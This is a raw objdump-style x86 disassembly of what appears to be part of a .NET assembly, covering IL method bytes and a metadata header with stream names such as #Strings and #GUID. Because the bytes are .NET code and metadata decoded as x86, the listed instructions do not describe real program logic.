  4040e4:	11 07                	adc    %eax,(%edi)
  4040e6:	2c 0b                	sub    $0xb,%al
  4040e8:	72 39                	jb     0x404123
  4040ea:	07                   	pop    %es
  4040eb:	00 70 73             	add    %dh,0x73(%eax)
  4040ee:	e5 00                	in     $0x0,%eax
  4040f0:	00 0a                	add    %cl,(%edx)
  4040f2:	7a 00                	jp     0x4040f4
  4040f4:	de 0d 11 04 2c 08    	fimuls 0x82c0411
  4040fa:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4040fd:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404102:	dc 1f                	fcompl (%edi)
  404104:	10 8d 59 00 00 01    	adc    %cl,0x1000059(%ebp)
  40410a:	0d 07 09 16 1f       	or     $0x1f160907,%eax
  40410f:	10 6f 41             	adc    %ch,0x41(%edi)
  404112:	00 00                	add    %al,(%eax)
  404114:	0a 26                	or     (%esi),%ah
  404116:	08 09                	or     %cl,(%ecx)
  404118:	6f                   	outsl  %ds:(%esi),(%dx)
  404119:	e6 00                	out    %al,$0x0
  40411b:	00 0a                	add    %cl,(%edx)
  40411d:	00 07                	add    %al,(%edi)
  40411f:	08 6f e7             	or     %ch,-0x19(%edi)
  404122:	00 00                	add    %al,(%eax)
  404124:	0a 16                	or     (%esi),%dl
  404126:	73 de                	jae    0x404106
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 13                	or     (%ebx),%dl
  40412c:	08 00                	or     %al,(%eax)
  40412e:	07                   	pop    %es
  40412f:	6f                   	outsl  %ds:(%esi),(%dx)
  404130:	e8 00 00 0a 1f       	call   0x1f4a4135
  404135:	10 6a 59             	adc    %ch,0x59(%edx)
  404138:	17                   	pop    %ss
  404139:	6a 58                	push   $0x58
  40413b:	d4 8d                	aam    $0x8d
  40413d:	59                   	pop    %ecx
  40413e:	00 00                	add    %al,(%eax)
  404140:	01 13                	add    %edx,(%ebx)
  404142:	09 11                	or     %edx,(%ecx)
  404144:	08 11                	or     %dl,(%ecx)
  404146:	09 16                	or     %edx,(%esi)
  404148:	11 09                	adc    %ecx,(%ecx)
  40414a:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40414d:	41                   	inc    %ecx
  40414e:	00 00                	add    %al,(%eax)
  404150:	0a 8d 59 00 00 01    	or     0x1000059(%ebp),%cl
  404156:	13 0a                	adc    (%edx),%ecx
  404158:	11 09                	adc    %ecx,(%ecx)
  40415a:	16                   	push   %ss
  40415b:	11 0a                	adc    %ecx,(%edx)
  40415d:	16                   	push   %ss
  40415e:	11 0a                	adc    %ecx,(%edx)
  404160:	8e 69 28             	mov    0x28(%ecx),%gs
  404163:	e9 00 00 0a 00       	jmp    0x4a4168
  404168:	11 0a                	adc    %ecx,(%edx)
  40416a:	13 0b                	adc    (%ebx),%ecx
  40416c:	de 23                	fisubs (%ebx)
  40416e:	11 08                	adc    %ecx,(%eax)
  404170:	2c 08                	sub    $0x8,%al
  404172:	11 08                	adc    %ecx,(%eax)
  404174:	6f                   	outsl  %ds:(%esi),(%dx)
  404175:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40417a:	dc 08                	fmull  (%eax)
  40417c:	2c 07                	sub    $0x7,%al
  40417e:	08 6f 2d             	or     %ch,0x2d(%edi)
  404181:	00 00                	add    %al,(%eax)
  404183:	0a 00                	or     (%eax),%al
  404185:	dc 07                	faddl  (%edi)
  404187:	2c 07                	sub    $0x7,%al
  404189:	07                   	pop    %es
  40418a:	6f                   	outsl  %ds:(%esi),(%dx)
  40418b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404190:	dc 11                	fcoml  (%ecx)
  404192:	0b 2a                	or     (%edx),%ebp
  404194:	41                   	inc    %ecx
  404195:	64 00 00             	add    %al,%fs:(%eax)
  404198:	02 00                	add    (%eax),%al
  40419a:	00 00                	add    %al,(%eax)
  40419c:	65 00 00             	add    %al,%gs:(%eax)
  40419f:	00 55 00             	add    %dl,0x0(%ebp)
  4041a2:	00 00                	add    %al,(%eax)
  4041a4:	ba 00 00 00 0d       	mov    $0xd000000,%edx
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	00 00                	add    %al,(%eax)
  4041ad:	00 00                	add    %al,(%eax)
  4041af:	00 02                	add    %al,(%edx)
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	00 f1                	add    %dh,%cl
  4041b5:	00 00                	add    %al,(%eax)
  4041b7:	00 41 00             	add    %al,0x0(%ecx)
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	32 01                	xor    (%ecx),%al
  4041be:	00 00                	add    %al,(%eax)
  4041c0:	0d 00 00 00 00       	or     $0x0,%eax
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 02                	add    %al,(%edx)
  4041c9:	00 00                	add    %al,(%eax)
  4041cb:	00 22                	add    %ah,(%edx)
  4041cd:	00 00                	add    %al,(%eax)
  4041cf:	00 1d 01 00 00 3f    	add    %bl,0x3f000001
  4041d5:	01 00                	add    %eax,(%eax)
  4041d7:	00 0b                	add    %cl,(%ebx)
  4041d9:	00 00                	add    %al,(%eax)
  4041db:	00 00                	add    %al,(%eax)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	00 02                	add    %al,(%edx)
  4041e1:	00 00                	add    %al,(%eax)
  4041e3:	00 1b                	add    %bl,(%ebx)
  4041e5:	00 00                	add    %al,(%eax)
  4041e7:	00 2f                	add    %ch,(%edi)
  4041e9:	01 00                	add    %eax,(%eax)
  4041eb:	00 4a 01             	add    %cl,0x1(%edx)
  4041ee:	00 00                	add    %al,(%eax)
  4041f0:	0b 00                	or     (%eax),%eax
  4041f2:	00 00                	add    %al,(%eax)
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	13 30                	adc    (%eax),%esi
  4041fa:	03 00                	add    (%eax),%eax
  4041fc:	30 00                	xor    %al,(%eax)
  4041fe:	00 00                	add    %al,(%eax)
  404200:	1b 00                	sbb    (%eax),%eax
  404202:	00 11                	add    %dl,(%ecx)
  404204:	00 17                	add    %dl,(%edi)
  404206:	0a 16                	or     (%esi),%dl
  404208:	0b 2b                	or     (%ebx),%ebp
  40420a:	17                   	pop    %ss
  40420b:	00 03                	add    %al,(%ebx)
  40420d:	07                   	pop    %es
  40420e:	91                   	xchg   %eax,%ecx
  40420f:	04 07                	add    $0x7,%al
  404211:	91                   	xchg   %eax,%ecx
  404212:	fe 01                	incb   (%ecx)
  404214:	16                   	push   %ss
  404215:	fe 01                	incb   (%ecx)
  404217:	0c 08                	or     $0x8,%al
  404219:	2c 02                	sub    $0x2,%al
  40421b:	16                   	push   %ss
  40421c:	0a 00                	or     (%eax),%al
  40421e:	07                   	pop    %es
  40421f:	17                   	pop    %ss
  404220:	58                   	pop    %eax
  404221:	0b 07                	or     (%edi),%eax
  404223:	03 8e 69 fe 04 0d    	add    0xd04fe69(%esi),%ecx
  404229:	09 2d df 06 13 04    	or     %ebp,0x41306df
  40422f:	2b 00                	sub    (%eax),%eax
  404231:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  404234:	62 1f                	bound  %ebx,(%edi)
  404236:	20 8d 59 00 00 01    	and    %cl,0x1000059(%ebp)
  40423c:	25 d0 28 00 00       	and    $0x28d0,%eax
  404241:	04 28                	add    $0x28,%al
  404243:	ea 00 00 0a 80 27 00 	ljmp   $0x27,$0x800a0000
  40424a:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40424d:	00 00                	add    %al,(%eax)
  40424f:	00 1b                	add    %bl,(%ebx)
  404251:	30 03                	xor    %al,(%ebx)
  404253:	00 70 00             	add    %dh,0x0(%eax)
  404256:	00 00                	add    %al,(%eax)
  404258:	1c 00                	sbb    $0x0,%al
  40425a:	00 11                	add    %dl,(%ecx)
  40425c:	00 28                	add    %ch,(%eax)
  40425e:	17                   	pop    %ss
  40425f:	00 00                	add    %al,(%eax)
  404261:	0a 02                	or     (%edx),%al
  404263:	6f                   	outsl  %ds:(%esi),(%dx)
  404264:	18 00                	sbb    %al,(%eax)
  404266:	00 0a                	add    %cl,(%edx)
  404268:	0a 73 eb             	or     -0x15(%ebx),%dh
  40426b:	00 00                	add    %al,(%eax)
  40426d:	0a 0c 00             	or     (%eax,%eax,1),%cl
  404270:	08 06                	or     %al,(%esi)
  404272:	6f                   	outsl  %ds:(%esi),(%dx)
  404273:	8f 00                	pop    (%eax)
  404275:	00 0a                	add    %cl,(%edx)
  404277:	0a 00                	or     (%eax),%al
  404279:	de 0b                	fimuls (%ebx)
  40427b:	08 2c 07             	or     %ch,(%edi,%eax,1)
  40427e:	08 6f 2d             	or     %ch,0x2d(%edi)
  404281:	00 00                	add    %al,(%eax)
  404283:	0a 00                	or     (%eax),%al
  404285:	dc 73 90             	fdivl  -0x70(%ebx)
  404288:	00 00                	add    %al,(%eax)
  40428a:	0a 0b                	or     (%ebx),%cl
  40428c:	00 06                	add    %al,(%esi)
  40428e:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  404293:	1f                   	pop    %ds
  404294:	09 11                	or     %edx,(%ecx)
  404296:	04 91                	add    $0x91,%al
  404298:	13 05 07 12 05 72    	adc    0x72051207,%eax
  40429e:	8f 07                	pop    (%edi)
  4042a0:	00 70 28             	add    %dh,0x28(%eax)
  4042a3:	91                   	xchg   %eax,%ecx
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	0a 6f 92             	or     -0x6e(%edi),%ch
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	0a 26                	or     (%esi),%ah
  4042ad:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4042b0:	58                   	pop    %eax
  4042b1:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4042b4:	04 09                	add    $0x9,%al
  4042b6:	8e 69 32             	mov    0x32(%ecx),%gs
  4042b9:	da 07                	fiaddl (%edi)
  4042bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4042bc:	33 00                	xor    (%eax),%eax
  4042be:	00 0a                	add    %cl,(%edx)
  4042c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4042c1:	94                   	xchg   %eax,%esp
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	0a 13                	or     (%ebx),%dl
  4042c6:	06                   	push   %es
  4042c7:	2b 00                	sub    (%eax),%eax
  4042c9:	11 06                	adc    %eax,(%esi)
  4042cb:	2a 01                	sub    (%ecx),%al
  4042cd:	10 00                	adc    %al,(%eax)
  4042cf:	00 02                	add    %al,(%edx)
  4042d1:	00 13                	add    %dl,(%ebx)
  4042d3:	00 0c 1f             	add    %cl,(%edi,%ebx,1)
  4042d6:	00 0b                	add    %cl,(%ebx)
  4042d8:	00 00                	add    %al,(%eax)
  4042da:	00 00                	add    %al,(%eax)
  4042dc:	1b 30                	sbb    (%eax),%esi
  4042de:	02 00                	add    (%eax),%al
  4042e0:	1f                   	pop    %ds
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	00 1d 00 00 11 00    	add    %bl,0x110000
  4042e9:	73 eb                	jae    0x4042d6
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 0a                	or     (%edx),%cl
  4042ef:	00 06                	add    %al,(%esi)
  4042f1:	02 6f 8f             	add    -0x71(%edi),%ch
  4042f4:	00 00                	add    %al,(%eax)
  4042f6:	0a 0b                	or     (%ebx),%cl
  4042f8:	de 0b                	fimuls (%ebx)
  4042fa:	06                   	push   %es
  4042fb:	2c 07                	sub    $0x7,%al
  4042fd:	06                   	push   %es
  4042fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ff:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  404304:	dc 07                	faddl  (%edi)
  404306:	2a 00                	sub    (%eax),%al
  404308:	01 10                	add    %edx,(%eax)
  40430a:	00 00                	add    %al,(%eax)
  40430c:	02 00                	add    (%eax),%al
  40430e:	07                   	pop    %es
  40430f:	00 0b                	add    %cl,(%ebx)
  404311:	12 00                	adc    (%eax),%al
  404313:	0b 00                	or     (%eax),%eax
  404315:	00 00                	add    %al,(%eax)
  404317:	00 42 53             	add    %al,0x53(%edx)
  40431a:	4a                   	dec    %edx
  40431b:	42                   	inc    %edx
  40431c:	01 00                	add    %eax,(%eax)
  40431e:	01 00                	add    %eax,(%eax)
  404320:	00 00                	add    %al,(%eax)
  404322:	00 00                	add    %al,(%eax)
  404324:	0c 00                	or     $0x0,%al
  404326:	00 00                	add    %al,(%eax)
  404328:	76 34                	jbe    0x40435e
  40432a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40432d:	33 30                	xor    (%eax),%esi
  40432f:	33 31                	xor    (%ecx),%esi
  404331:	39 00                	cmp    %eax,(%eax)
  404333:	00 00                	add    %al,(%eax)
  404335:	00 05 00 6c 00 00    	add    %al,0x6c00
  40433b:	00 00                	add    %al,(%eax)
  40433d:	15 00 00 23 7e       	adc    $0x7e230000,%eax
  404342:	00 00                	add    %al,(%eax)
  404344:	6c                   	insb   (%dx),%es:(%edi)
  404345:	15 00 00 d8 18       	adc    $0x18d80000,%eax
  40434a:	00 00                	add    %al,(%eax)
  40434c:	23 53 74             	and    0x74(%ebx),%edx
  40434f:	72 69                	jb     0x4043ba
  404351:	6e                   	outsb  %ds:(%esi),(%dx)
  404352:	67 73 00             	addr16 jae 0x404355
  404355:	00 00                	add    %al,(%eax)
  404357:	00 44 2e 00          	add    %al,0x0(%esi,%ebp,1)
  40435b:	00 98 07 00 00 23    	add    %bl,0x23000007(%eax)
  404361:	55                   	push   %ebp
  404362:	53                   	push   %ebx
  404363:	00 dc                	add    %bl,%ah
  404365:	35 00 00 10 00       	xor    $0x100000,%eax
  40436a:	00 00                	add    %al,(%eax)
  40436c:	23 47 55             	and    0x55(%edi),%eax
  40436f:	49                   	dec    %ecx
  404370:	44                   	inc    %esp
  404371:	00 00                	add    %al,(%eax)
  404373:	00 ec                	add    %ch,%ah
  404375:	35 00 00 38 07       	xor    $0x7380000,%eax
  40437a:	00 00                	add    %al,(%eax)
  40437c:	23 42 6c             	and    0x6c(%edx),%eax
  40437f:	6f                   	outsl  %ds:(%esi),(%dx)
  404380:	62 00                	bound  %eax,(%eax)
  404382:	00 00                	add    %al,(%eax)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 00                	add    %al,(%eax)
  404388:	02 00                	add    (%eax),%al
  40438a:	00 01                	add    %al,(%ecx)
  40438c:	57                   	push   %edi
  40438d:	9d                   	popf
  40438e:	a2 3d 09 0a 00       	mov    %al,0xa093d
  404393:	00 00                	add    %al,(%eax)
  404395:	fa                   	cli
  404396:	01 33                	add    %esi,(%ebx)
  404398:	00 16                	add    %dl,(%esi)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	01 00                	add    %eax,(%eax)
  40439e:	00 00                	add    %al,(%eax)
  4043a0:	95                   	xchg   %eax,%ebp
  4043a1:	00 00                	add    %al,(%eax)
  4043a3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	2d 00 00 00 53       	sub    $0x53000000,%eax
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	00 31                	add    %dh,(%ecx)
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	00 eb                	add    %ch,%bl
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	00 07                	add    %al,(%edi)
  4043b9:	00 00                	add    %al,(%eax)
  4043bb:	00 3a                	add    %bh,(%edx)
  4043bd:	00 00                	add    %al,(%eax)
  4043bf:	00 01                	add    %al,(%ecx)
  4043c1:	00 00                	add    %al,(%eax)
  4043c3:	00 1d 00 00 00 01    	add    %bl,0x1000000
  4043c9:	00 00                	add    %al,(%eax)
  4043cb:	00 0b                	add    %cl,(%ebx)
  4043cd:	00 00                	add    %al,(%eax)
  4043cf:	00 15 00 00 00 03    	add    %dl,0x3000000
  4043d5:	00 00                	add    %al,(%eax)
  4043d7:	00 06                	add    %al,(%esi)
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	00 06                	add    %al,(%esi)
  4043dd:	00 00                	add    %al,(%eax)
  4043df:	00 01                	add    %al,(%ecx)
  4043e1:	00 00                	add    %al,(%eax)
  4043e3:	00 01                	add    %al,(%ecx)
  4043e5:	00 00                	add    %al,(%eax)
  4043e7:	00 09                	add    %cl,(%ecx)
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	00 03                	add    %al,(%ebx)
  4043ed:	00 00                	add    %al,(%eax)
  4043ef:	00 01                	add    %al,(%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 00                	add    %al,(%eax)
  4043f5:	00 53 09             	add    %dl,0x9(%ebx)
  4043f8:	01 00                	add    %eax,(%eax)
  4043fa:	00 00                	add    %al,(%eax)
  4043fc:	00 00                	add    %al,(%eax)
  4043fe:	06                   	push   %es
  4043ff:	00 68 08             	add    %ch,0x8(%eax)
  404402:	75 12                	jne    0x404416
  404404:	06                   	push   %es
  404405:	00 d5                	add    %dl,%ch
  404407:	08 75 12             	or     %dh,0x12(%ebp)
  40440a:	06                   	push   %es
  40440b:	00 81 07 17 12 0f    	add    %al,0xf121707(%ecx)
  404411:	00 95 12 00 00 06    	add    %dl,0x6000012(%ebp)
  404417:	00 c4                	add    %al,%ah
  404419:	07                   	pop    %es
  40441a:	b0 0e                	mov    $0xe,%al
  40441c:	06                   	push   %es
  40441d:	00 4b 08             	add    %cl,0x8(%ebx)
  404420:	b0 0e                	mov    $0xe,%al
  404422:	06                   	push   %es
  404423:	00 2c 08             	add    %ch,(%eax,%ecx,1)
  404426:	b0 0e                	mov    $0xe,%al
  404428:	06                   	push   %es
  404429:	00 bc 08 b0 0e 06 00 	add    %bh,0x60eb0(%eax,%ecx,1)
  404430:	88 08                	mov    %cl,(%eax)
  404432:	b0 0e                	mov    $0xe,%al
  404434:	06                   	push   %es
  404435:	00 a1 08 b0 0e 06    	add    %ah,0x60eb008(%ecx)
  40443b:	00 db                	add    %bl,%bl
  40443d:	07                   	pop    %es
  40443e:	b0 0e                	mov    $0xe,%al
  404440:	06                   	push   %es
  404441:	00 b0 07 56 12 06    	add    %dh,0x6125607(%eax)
  404447:	00 0f                	add    %cl,(%edi)
  404449:	08 b0 0e 06 00 f6    	or     %dh,-0x9fff9f2(%eax)
  40444f:	07                   	pop    %es
  404450:	58                   	pop    %eax
  404451:	0a 06                	or     (%esi),%al
  404453:	00 36                	add    %dh,(%esi)
  404455:	15 98 0d 0a 00       	adc    $0xa0d98,%eax
  40445a:	77 00                	ja     0x40445c
  40445c:	dd 12                	fstl   (%edx)
  40445e:	06                   	push   %es
  40445f:	00 38                	add    %bh,(%eax)
  404461:	10 2d 18 06 00 4b    	adc    %ch,0x4b000618
  404467:	0f 98 0d 06 00 66 07 	sets   0x7660006
  40446e:	75 12                	jne    0x404482
  404470:	06                   	push   %es
  404471:	00 21                	add    %ah,(%ecx)
  404473:	07                   	pop    %es
  404474:	17                   	pop    %ss
  404475:	12 06                	adc    (%esi),%al
  404477:	00 95 07 17 12 0a    	add    %dl,0xa121707(%ebp)
  40447d:	00 9c 15 b3 14 0a 00 	add    %bl,0xa14b3(%ebp,%edx,1)
  404484:	4f                   	dec    %edi
  404485:	0d a5 18 06 00       	or     $0x618a5,%eax
  40448a:	34 11                	xor    $0x11,%al
  40448c:	ee                   	out    %al,(%dx)
  40448d:	09 0a                	or     %ecx,(%edx)
  40448f:	00 9e 14 5b 15 0a    	add    %bl,0xa155b14(%esi)
  404495:	00 ef                	add    %ch,%bh
  404497:	15 5b 15 0a 00       	adc    $0xa155b,%eax
  40449c:	8e 0c 5b             	mov    (%ebx,%ebx,2),%cs
  40449f:	15 06 00 e4 06       	adc    $0x6e40006,%eax
  4044a4:	dd 12                	fstl   (%edx)
  4044a6:	0a 00                	or     (%eax),%al
  4044a8:	19 0e                	sbb    %ecx,(%esi)
  4044aa:	dd 12                	fstl   (%edx)
  4044ac:	0a 00                	or     (%eax),%al
  4044ae:	63 14 a5 18 06 00 d1 	arpl   %edx,-0x2efff9e8(,%eiz,4)
  4044b5:	15 98 0d 06 00       	adc    $0x60d98,%eax
  4044ba:	56                   	push   %esi
  4044bb:	02 ee                	add    %dh,%ch
  4044bd:	09 06                	or     %eax,(%esi)
  4044bf:	00 66 0d             	add    %ah,0xd(%esi)
  4044c2:	89 01                	mov    %eax,(%ecx)
  4044c4:	0e                   	push   %cs
  4044c5:	00 d8                	add    %bl,%al
  4044c7:	0b bd 0b 06 00 6d    	or     0x6d00060b(%ebp),%edi
  4044cd:	0f 89 01 06 00 36    	jns    0x36404ad4
  4044d3:	0d 89 01 0a 00       	or     $0xa0189,%eax
  4044d8:	96                   	xchg   %eax,%esi
  4044d9:	14 17                	adc    $0x17,%al
  4044db:	12 0a                	adc    (%edx),%cl
  4044dd:	00 af 0f 17 12 06    	add    %ch,0x612170f(%edi)
  4044e3:	00 1c 18             	add    %bl,(%eax,%ebx,1)
  4044e6:	55                   	push   %ebp
  4044e7:	00 06                	add    %al,(%esi)
  4044e9:	00 6f 11             	add    %ch,0x11(%edi)
  4044ec:	89 01                	mov    %eax,(%ecx)
  4044ee:	12 00                	adc    (%eax),%al
  4044f0:	01 11                	add    %edx,(%ecx)
  4044f2:	57                   	push   %edi
  4044f3:	16                   	push   %ss
  4044f4:	12 00                	adc    (%eax),%al
  4044f6:	dc 0e                	fmull  (%esi)
  4044f8:	57                   	push   %edi
  4044f9:	16                   	push   %ss
  4044fa:	ab                   	stos   %eax,%es:(%edi)
  4044fb:	00 a8 11 00 00 12    	add    %ch,0x12000011(%eax)
  404501:	00 18                	add    %bl,(%eax)
  404503:	15 57 16 06 00       	adc    $0x61657,%eax
  404508:	1f                   	pop    %ds
  404509:	10 2d 18 06 00 6a    	adc    %ch,0x6a000618
  40450f:	10 4b 17             	adc    %cl,0x17(%ebx)
  404512:	06                   	push   %es
  404513:	00 38                	add    %bh,(%eax)
  404515:	06                   	push   %es
  404516:	98                   	cwtl
  404517:	0d 06 00 2b 00       	or     $0x2b0006,%eax
  40451c:	06                   	push   %es
  40451d:	02 16                	add    (%esi),%dl
  40451f:	00 55 0f             	add    %dl,0xf(%ebp)
  404522:	41                   	inc    %ecx
  404523:	0a 16                	or     (%esi),%dl
  404525:	00 05 15 41 0a 06    	add    %al,0x60a4115
  40452b:	00 a2 17 ee 09 06    	add    %ah,0x609ee17(%edx)
  404531:	00 fd                	add    %bh,%ch
  404533:	0d 98 0d 0a 00       	or     $0xa0d98,%eax
  404538:	a9 13 55 00 c3       	test   $0xc3005513,%eax
  40453d:	00 c6                	add    %al,%dh
  40453f:	11 00                	adc    %eax,(%eax)
  404541:	00 06                	add    %al,(%esi)
  404543:	00 4a 18             	add    %cl,0x18(%edx)
  404546:	b0 0e                	mov    $0xe,%al
  404548:	06                   	push   %es
  404549:	00 aa 06 98 0d 1a    	add    %ch,0x1a0d9806(%edx)
  40454f:	00 20                	add    %ah,(%eax)
  404551:	00 75 12             	add    %dh,0x12(%ebp)
  404554:	1a 00                	sbb    (%eax),%al
  404556:	01 00                	add    %eax,(%eax)
  404558:	98                   	cwtl
  404559:	0d 1a 00 57 07       	or     $0x757001a,%eax
  40455e:	75 12                	jne    0x404572
  404560:	06                   	push   %es
  404561:	00 18                	add    %bl,(%eax)
  404563:	13 2d 18 1a 00 51    	adc    0x51001a18,%ebp
  404569:	10 2d 18 06 00 59    	adc    %ch,0x59000618
  40456f:	0d 2d 18 06 00       	or     $0x6182d,%eax
  404574:	94                   	xchg   %eax,%esp
  404575:	00 2d 18 06 00 66    	add    %ch,0x66000618
  40457b:	02 2d 18 06 00 85    	add    0x85000618,%ch
  404581:	06                   	push   %es
  404582:	98                   	cwtl
  404583:	0d 06 00 24 17       	or     $0x17240006,%eax
  404588:	98                   	cwtl
  404589:	0d 06 00 69 16       	or     $0x16690006,%eax
  40458e:	98                   	cwtl
  40458f:	0d 0a 00 ff 17       	or     $0x17ff000a,%eax
  404594:	dd 12                	fstl   (%edx)
  404596:	06                   	push   %es
  404597:	00 c3                	add    %al,%bl
  404599:	0d 2d 18 06 00       	or     $0x6182d,%eax
  40459e:	38 0a                	cmp    %cl,(%edx)
  4045a0:	4b                   	dec    %ebx
  4045a1:	17                   	pop    %ss
  4045a2:	06                   	push   %es
  4045a3:	00 cf                	add    %cl,%bh
  4045a5:	09 2d 18 0a 00 53    	or     %ebp,0x53000a18
  4045ab:	18 b3 14 0a 00 a4    	sbb    %dh,-0x5bfff5ec(%ebx)
  4045b1:	06                   	push   %es
  4045b2:	b3 14                	mov    $0x14,%bl
  4045b4:	0a 00                	or     (%eax),%al
  4045b6:	8f 06                	pop    (%esi)
  4045b8:	b3 14                	mov    $0x14,%bl
  4045ba:	06                   	push   %es
  4045bb:	00 d3                	add    %dl,%bl
  4045bd:	0a 98 0d 06 00 0d    	or     0xd00060d(%eax),%bl
  4045c3:	10 98 0d 06 00 e5    	adc    %bl,-0x1afff9f3(%eax)
  4045c9:	0d 98 0d 0a 00       	or     $0xa0d98,%eax
  4045ce:	23 14 5b             	and    (%ebx,%ebx,2),%edx
  4045d1:	15 0a 00 e4 13       	adc    $0x13e4000a,%eax
  4045d6:	5b                   	pop    %ebx
  4045d7:	15 06 00 30 14       	adc    $0x14300006,%eax
  4045dc:	98                   	cwtl
  4045dd:	0d 06 00 a8 04       	or     $0x4a80006,%eax
  4045e2:	98                   	cwtl
  4045e3:	0d 0a 00 29 0b       	or     $0xb29000a,%eax
  4045e8:	17                   	pop    %ss
  4045e9:	12 0a                	adc    (%edx),%cl
  4045eb:	00 41 0d             	add    %al,0xd(%ecx)
  4045ee:	b3 14                	mov    $0x14,%bl
  4045f0:	0a 00                	or     (%eax),%al
  4045f2:	ee                   	out    %al,(%dx)
  4045f3:	0b a5 18 06 00 6c    	or     0x6c000618(%ebp),%esp
  4045f9:	0d 89 01 0a 00       	or     $0xa0189,%eax
  4045fe:	c3                   	ret
  4045ff:	16                   	push   %ss
  404600:	5b                   	pop    %ebx
  404601:	15 0a 00 c2 0e       	adc    $0xec2000a,%eax
  404606:	dd 12                	fstl   (%edx)
  404608:	0a 00                	or     (%eax),%al
  40460a:	01 14 91             	add    %edx,(%ecx,%edx,4)
  40460d:	0e                   	push   %cs
  40460e:	06                   	push   %es
  40460f:	00 07                	add    %al,(%edi)
  404611:	09 98 0d 06 00 12    	or     %ebx,0x1200060d(%eax)
  404617:	0c ee                	or     $0xee,%al
  404619:	09 06                	or     %eax,(%esi)
  40461b:	00 e0                	add    %ah,%al
  40461d:	0b 98 0d 0a 00 b0    	or     -0x4ffff5f3(%eax),%ebx
  404623:	0b 98 0d 0a 00 75    	or     0x75000a0d(%eax),%ebx
  404629:	06                   	push   %es
  40462a:	98                   	cwtl
  40462b:	0d 06 00 8d 11       	or     $0x118d0006,%eax
  404630:	98                   	cwtl
  404631:	0d 06 00 8e 00       	or     $0x8e0006,%eax
  404636:	98                   	cwtl
  404637:	0d 06 00 0b 17       	or     $0x170b0006,%eax
  40463c:	ee                   	out    %al,(%dx)
  40463d:	09 06                	or     %eax,(%esi)
  40463f:	00 e8                	add    %ch,%al
  404641:	11 ee                	adc    %ebp,%esi
  404643:	09 0a                	or     %ecx,(%edx)
  404645:	00 5e 04             	add    %bl,0x4(%esi)
  404648:	b3 14                	mov    $0x14,%bl
  40464a:	06                   	push   %es
  40464b:	00 26                	add    %ah,(%esi)
  40464d:	01 98 0d 06 00 78    	add    %ebx,0x7800060d(%eax)
  404653:	0b 89 01 0a 00 5d    	or     0x5d000a01(%ecx),%ecx
  404659:	05 17 12 06 00       	add    $0x61217,%eax
  40465e:	80 0f 89             	orb    $0x89,(%edi)
  404661:	01 0a                	add    %ecx,(%edx)
  404663:	00 7b 05             	add    %bh,0x5(%ebx)
  404666:	17                   	pop    %ss
  404667:	12 06                	adc    (%esi),%al
  404669:	00 82 18 55 00 1e    	add    %al,0x1e005518(%edx)
  40466f:	00 8e 13 21 02 06    	add    %cl,0x6022113(%esi)
  404675:	00 2f                	add    %ch,(%edi)
  404677:	0c 55                	or     $0x55,%al
  404679:	00 06                	add    %al,(%esi)
  40467b:	00 18                	add    %bl,(%eax)
  40467d:	05 89 01 06 00       	add    $0x60189,%eax
  404682:	1e                   	push   %ds
  404683:	04 89                	add    $0x89,%al
  404685:	01 06                	add    %eax,(%esi)
  404687:	00 7c 11 89          	add    %bh,-0x77(%ecx,%edx,1)
  40468b:	01 06                	add    %eax,(%esi)
  40468d:	00 76 0f             	add    %dh,0xf(%esi)
  404690:	89 01                	mov    %eax,(%ecx)
  404692:	1e                   	push   %ds
  404693:	00 8f 0f 38 12 06    	add    %cl,0x612380f(%edi)
  404699:	00 10                	add    %dl,(%eax)
  40469b:	12 98 0d 06 00 67    	adc    0x6700060d(%eax),%bl
  4046a1:	00 98 0d 06 00 8f    	add    %bl,-0x70fff9f3(%eax)
  4046a7:	0d 98 0d 06 00       	or     $0x60d98,%eax
  4046ac:	d7                   	xlat   %ds:(%ebx)
  4046ad:	0d 2d 18 06 00       	or     $0x6182d,%eax
  4046b2:	04 0e                	add    $0xe,%al
  4046b4:	98                   	cwtl
  4046b5:	0d 22 00 85 0e       	or     $0xe850022,%eax
  4046ba:	0e                   	push   %cs
  4046bb:	14 06                	adc    $0x6,%al
  4046bd:	00 b9 18 a0 0c 06    	add    %bh,0x60ca018(%ecx)
  4046c3:	00 ba 0c a0 0c 06    	add    %bh,0x60ca00c(%edx)
  4046c9:	00 26                	add    %ah,(%esi)
  4046cb:	05 a0 0c 06 00       	add    $0x60ca0,%eax
  4046d0:	af                   	scas   %es:(%edi),%eax
  4046d1:	02 98 0d 06 00 06    	add    0x600060d(%eax),%bl
  4046d7:	05 ee 09 0a 00       	add    $0xa09ee,%eax
  4046dc:	1a 11                	sbb    (%ecx),%dl
  4046de:	55                   	push   %ebp
